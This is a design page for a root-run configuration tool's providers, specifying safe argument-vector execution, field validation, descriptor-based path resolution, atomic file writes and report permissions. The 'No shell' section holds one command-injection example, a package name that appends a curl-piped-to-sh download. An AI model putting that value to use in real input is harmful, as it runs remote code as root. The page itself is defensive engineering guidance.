# Applying state safely

A provider runs as root and acts on paths and names that came from a file. This page specifies the
handling required to keep that from becoming a local privilege escalation.

!!! note "Proposed behaviour"

    These are requirements on providers. Nothing is implemented yet. The path handling is specified
    in detail here because it is the hardest part to retrofit.

## No shell

A provider invokes a program with an argument vector. Command lines are never assembled and passed
to a shell.

```text
exec("apt-get", ["apt-get", "install", "-y", name])     required
system("apt-get install -y " + name)                    forbidden
```

With an argument vector, a package name of `nginx; curl http://host/x | sh` is passed to
`apt-get` as one argument and fails as an unknown package. With a shell, it is two commands and
the second one runs as root.

The rule applies to providers alone. No component above the provider boundary executes programs.

## Field validation happens when the manifest loads

Validation happens as documents load, which keeps one set of rules for every provider. A bad value
is a manifest error raised before the host is read.

Two layers of checking apply.

The universal layer rejects character classes that are dangerous regardless of distribution.

| Rule | Applies to |
| ---- | ---------- |
| No NUL or ASCII control characters | Every string field |
| No whitespace | Names and keys |
| No shell metacharacters | Names and keys |
| No `/` | Package, service, user and group names |
| Must be absolute | Paths |
| No `..` or empty component | Paths |

The per-distribution layer belongs to providers, where the rules differ. Debian package names permit
a narrower character set than RPM names do. A provider that rejects a name its package manager would
not accept reports the problem in terms of the resource.

The table names the dangerous classes and leaves the exact pattern to each provider, so no single
distribution's rules are applied everywhere.

## Resolving a managed path

An unprivileged user who can create entries in a directory Datum writes to is in a position to
redirect a root write. The resolution below closes that.

The path is resolved once per pass and every subsequent operation uses the resulting directory
descriptor, never the path string.

1. The parent directory is resolved and held open as a file descriptor.
2. Its device and inode numbers are recorded in the plan.
3. The final component is opened relative to that descriptor with `O_NOFOLLOW`, so a symbolic link
   in the position being managed is an error and not something followed.
4. At apply time the descriptor is confirmed to still refer to the recorded device and inode before
   anything is written.
5. Every operation uses the descriptor, so `openat`, `renameat`, `fchown` and `fchmod` in place of
   their path-based equivalents.

The held descriptor closes the window between deciding and acting. A path string re-resolved at
apply time can resolve somewhere else. A descriptor continues to refer to the directory that was
inspected.

Refusing to follow a symbolic link on the final component is the narrow and important case.
Intermediate components are resolved normally, because refusing symbolic links anywhere in a
path would break ordinary systems where `/var/run` points at `/run`.

## Writing a file

```text
openat(parent, ".datum.tmp.XXXX", O_CREAT|O_EXCL|O_WRONLY)
fchown(fd, owner, group)
fchmod(fd, mode)
write(fd, content)
fsync(fd)
renameat(parent, ".datum.tmp.XXXX", parent, "nginx.conf")
```

`O_EXCL` means the temporary file cannot be an existing file or a symbolic link planted in
advance. Ownership and mode are set on the descriptor before any content is written, so the file
is never briefly readable by the wrong user. The rename is atomic within the directory, so a
concurrent reader sees either the old content or the new content.

The temporary file is created in the target directory. A rename across filesystems is not atomic,
and `/tmp` is frequently a different filesystem.

## Hard links

An unprivileged user can create a hard link, in a directory they control, to a file they cannot
read. A resource that then changes ownership or mode on that path grants them access to the
original file.

A provider refuses to change ownership or mode on a path whose link count is greater than one,
unless the resource also manages the file's content, and reports the refusal instead of proceeding.
Managing content makes the case safe because the file is replaced by a rename instead of being
modified in place, which breaks the link rather than following it.

## Untrusted path components

A path that passes through a directory writable by someone other than root is reachable by that
user, and a resource under it is exposed to the races above even when every mitigation is
applied correctly.

Datum reports it. Each component of a managed path is checked, and a resource whose path passes
through a directory owned by a non-root user, or writable by group or other, is marked in the
plan.

```text
update   File[app-config]
         path      /var/lib/app/conf/app.yaml
         warning   /var/lib/app/conf is writable by uid 1001
```

`trust.strictPaths: true` turns that warning into a refusal for fleets that would rather fail than
proceed. The default is to warn, because the situation is common and often legitimate, and a control
that refuses by default here would be switched off, not fixed.

## Reports and content disclosure

A plan can contain the content of a file, so a report written where other local users can read
it discloses that content to them.

Reports are written under `state`, which is `/var/lib/datum` by default, with the directory at
mode `0700` and files at mode `0600`, both owned by root.

Content is recorded as a digest, never as text. A readable difference is rendered to a terminal on
request and is never written to a report.

## Marking content as sensitive

A file whose content should not be rendered at all can say so.

```yaml
datum: v1alpha1
type: File
name: app-credentials

desired:
  path: /etc/app/credentials
  owner: app
  group: app
  mode: "0600"
  source: files/credentials
  sensitive: true
```

With `sensitive: true`, the plan reports that the content differs and never shows it, on a terminal
or anywhere else. Ownership and mode are still reported normally.

!!! note "Important limitation"

    This is not secret management. The content still sits in the repository in plain text and is
    still readable by every host. The flag stops the content being echoed into output and reports,
    and it does nothing about where the content came from. The field is named after the handling it
    requests rather than after the thing it holds.

## Confining content sources

A `File` resource reads its content from `desired.source`, which is a path in the repository. An
unconfined source path would let a resource read anything the agent can read and write it to a
host.

A source path must be relative, is resolved against the directory containing its layer, and the
result has to remain inside the fleet root. Symbolic links inside the repository are resolved
and the same containment check applies to the result, so a link pointing outside the fleet is
rejected rather than followed.

The case this covers is a repository with path-based ownership, where somebody is trusted with one
subdirectory and not with the whole fleet. Without confinement, write access to any layer is
equivalent to read access to every file the agent can reach.
